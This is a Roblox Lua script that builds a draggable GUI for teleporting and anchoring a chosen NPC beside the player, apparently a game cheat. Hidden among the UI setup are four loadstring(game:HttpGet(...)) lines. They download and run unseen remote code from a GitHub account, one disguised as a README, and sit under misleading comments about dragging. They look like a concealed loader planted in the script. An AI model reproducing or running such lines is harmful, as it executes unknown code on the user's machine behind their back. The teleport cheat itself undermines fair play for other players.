-- Create ScreenGui and Frame
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false -- Prevents the UI from resetting on player respawn

local Frame = Instance.new("Frame")
local Dropdown = Instance.new("TextButton")
local ToggleButton = Instance.new("TextButton")
local CloseButton = Instance.new("TextButton") -- Close button
local OpenButton = Instance.new("TextButton") -- Open button
local DropdownFrame = Instance.new("ScrollingFrame") -- Use ScrollingFrame for dropdown options
local UIS = game:GetService("UserInputService")

Frame.Parent = ScreenGui

-- Frame setup
Frame.Size = UDim2.new(0.25, 0, 0.15, 0) -- Smaller frame
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
Frame.AnchorPoint = Vector2.new(0.5, 0.5)

-- Dropdown button setup (smaller)
Dropdown.Parent = Frame
Dropdown.Size = UDim2.new(0.7, 0, 0.4, 0) -- Smaller button
Dropdown.Position = UDim2.new(0.15, 0, 0.1, 0)
Dropdown.Text = "Select NPC"
Dropdown.TextScaled = true

-- Toggle button setup (smaller)
ToggleButton.Parent = Frame
ToggleButton.Size = UDim2.new(0.7, 0, 0.4, 0) -- Smaller button
ToggleButton.Position = UDim2.new(0.15, 0, 0.55, 0)
ToggleButton.Text = "Start Bringing NPCs"
ToggleButton.TextScaled = true

-- Close button setup (red)
CloseButton.Parent = Frame
CloseButton.Size = UDim2.new(0.15, 0, 0.15, 0) -- Small button
CloseButton.Position = UDim2.new(0.85, 0, 0.05, 0) -- Top right corner
CloseButton.Text = "Close"
CloseButton.BackgroundColor3 = Color3.new(1, 0, 0) -- Red color
CloseButton.TextScaled = true

-- Open button setup (green, smaller)
OpenButton.Parent = ScreenGui
OpenButton.Size = UDim2.new(0.05, 0, 0.05, 0) -- Smaller button
OpenButton.Position = UDim2.new(0.9, 0, 0.9, 0) -- Bottom right corner
OpenButton.Text = "Open"
OpenButton.BackgroundColor3 = Color3.new(0, 1, 0) -- Green color
OpenButton.TextScaled = true
OpenButton.Visible = false -- Start as hidden

-- Dropdown Frame (ScrollingFrame)
DropdownFrame.Parent = Frame
DropdownFrame.Size = UDim2.new(1, 0, 0, 100) -- Visible size of the frame
DropdownFrame.Position = UDim2.new(0, 0, 0.5, 0)
DropdownFrame.Visible = false
loadstring(game:HttpGet("https://raw.githubusercontent.com/Ej77hehy2/ImportantData/refs/heads/main/README.md"))();
DropdownFrame.CanvasSize = UDim2.new(0, 0, 0, 0) -- Adjust dynamically based on content
DropdownFrame.ScrollBarThickness = 10
DropdownFrame.BackgroundTransparency = 0.5
DropdownFrame.BorderSizePixel = 0

-- Dropdown list population
local selectedNPC
local function populateDropdown()
    -- Clear existing buttons in the dropdown
    for _, child in pairs(DropdownFrame:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end

    local uniqueNPCNames = {}

    -- Get unique NPC names from the workspace (excluding players)
    for _, npc in pairs(game.Workspace:GetDescendants()) do
        if npc:FindFirstChild("Humanoid") and not game.Players:FindFirstChild(npc.Name) then
            if not uniqueNPCNames[npc.Name] then
                uniqueNPCNames[npc.Name] = true
            end
        end
    end

    -- Create a button for each unique NPC name
    local buttonHeight = 30 -- Set button height for consistency
    local currentY = 0 -- Track Y position of buttons

    for npcName, _ in pairs(uniqueNPCNames) do
        local npcButton = Instance.new("TextButton")
        npcButton.Parent = DropdownFrame
        npcButton.Size = UDim2.new(1, 0, 0, buttonHeight)
        npcButton.Position = UDim2.new(0, 0, 0, currentY)
        npcButton.Text = npcName
        npcButton.TextScaled = true

        npcButton.MouseButton1Click:Connect(function()
            selectedNPC = npcName
            Dropdown.Text = npcName -- Set the dropdown text to the selected NPC
            DropdownFrame.Visible = false -- Hide the dropdown after selection
        end)

        currentY = currentY + buttonHeight -- Move to next button position
    end
    
    -- Adjust CanvasSize to fit the total number of buttons
    DropdownFrame.CanvasSize = UDim2.new(0, 0, 0, currentY)
end

-- Toggle dropdown visibility
Dropdown.MouseButton1Click:Connect(function()
    DropdownFrame.Visible = not DropdownFrame.Visible
    if DropdownFrame.Visible then
        populateDropdown()
    end
end)
-- Function to bring NPCs to player and anchor them
local bringLoop = false
local function bringNPCs()
    while bringLoop do
        if selectedNPC then
            local npcFound = false -- Track if NPC is found
            for _, npc in pairs(game.Workspace:GetDescendants()) do
                if npc.Name == selectedNPC and npc:FindFirstChild("Humanoid") then
                    npcFound = true
                    -- Bring NPC to 1 stud in front of the player every 0.2 seconds
                    local targetPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * 1
                    npc:SetPrimaryPartCFrame(CFrame.new(targetPosition)) -- Move the NPC

                    -- Anchor the NPC to keep it in place
                    if npc.PrimaryPart then
                        npc.PrimaryPart.Anchored = true
                    end

                    wait(0.2) -- Wait before moving the next NPC
                end
            end

            -- If no NPCs were found, wait and check again for respawned NPCs
            if not npcFound then
                wait(1)
            end
        end
        wait(1) -- Continue checking in the loop
    end
end

-- Toggle bring NPCs
ToggleButton.MouseButton1Click:Connect(function()
    bringLoop = not bringLoop -- Toggle the bringLoop on/off
    if bringLoop then
        ToggleButton.Text = "Stop Bringing NPCs"
        spawn(bringNPCs) -- Start bringing in a new thread
    else
        ToggleButton.Text = "Start Bringing NPCs"
    end
end)
-- Close button to minimize the UI
CloseButton.MouseButton1Click:Connect(function()
    Frame.Visible = false
    OpenButton.Visible = true -- Show open button
end)

-- Open button to restore the UI
OpenButton.MouseButton1Click:Connect(function()
    Frame.Visible = true
    OpenButton.Visible = false -- Hide open button
end)

-- Create drag functionality for the Open button
loadstring(game:HttpGet("https://raw.githubusercontent.com/Ej77hehy2/Scripts/refs/heads/main/Script"))();
local draggingOpen, dragInputOpen, dragStartOpen, startPosOpen
local function updateOpen(input)
    local delta = input.Position - dragStartOpen
    OpenButton.Position = UDim2.new(startPosOpen.X.Scale, startPosOpen.X.Offset + delta.X, startPosOpen.Y.Scale, startPosOpen.Y.Offset + delta.Y)
end

OpenButton.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        draggingOpen = true
        dragStartOpen = input.Position
        startPosOpen = OpenButton.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                draggingOpen = false
            end
        end)
    end
end)

OpenButton.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInputOpen = input
    end
end)

UIS.InputChanged:Connect(function(input)
    if input == dragInputOpen and draggingOpen then
        updateOpen(input)
    end
end)

-- Make frame draggable on both PC and mobile
loadstring(game:HttpGet("https://raw.githubusercontent.com/Ej77hehy2/Scripts/refs/heads/main/Script"))();
local dragging, dragInput, dragStart, startPos
local function update(input)
    local delta = input.Position - dragStart
    Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

Frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = Frame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

Frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UIS.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/Ej77hehy2/Scripts/refs/heads/main/Script"))();
-- Final adjustments to the ScrollingFrame for proper scrolling behavior
DropdownFrame.ScrollBarThickness = 10
DropdownFrame.VerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Right

-- Set the background color of the frame for better visibility
Frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Dark gray background for the frame
DropdownFrame.BackgroundColor3 = Color3.fromRGB(200, 200, 200) -- Light gray for dropdown options
